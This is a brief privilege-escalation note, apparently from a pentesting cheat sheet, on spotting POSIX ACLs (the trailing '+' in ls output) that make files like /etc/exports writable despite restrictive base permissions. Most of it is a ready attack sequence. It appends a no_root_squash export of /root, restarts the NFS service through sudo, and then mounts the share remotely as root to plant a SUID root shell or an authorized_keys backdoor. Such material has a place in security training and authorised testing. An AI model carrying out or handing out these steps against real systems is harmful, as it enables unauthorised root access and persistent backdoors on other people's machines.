# POSIX ACL Bypasses Nominal File Permissions

`ls -l` showing `-rw-r--r--` doesn't mean read-only to you — a trailing `+` means a POSIX ACL grants more. Always check it on sensitive-looking config files (`/etc/exports`, service configs) even when base perms look locked down:

```bash
ls -lah /etc/exports            # "-rw-rw-r--+" <- the trailing + is the tell
getfacl /etc/exports            # shows the extra user/group ACE granting write
echo '/root *(rw,sync,no_root_squash)' >> /etc/exports
sudo systemctl restart nfs-kernel-server.service     # if sudo -l allows this specific restart
```
Combine with `no_root_squash` on the new export: mount it from outside as root and drop a root-owned SUID shell or an `authorized_keys` entry.
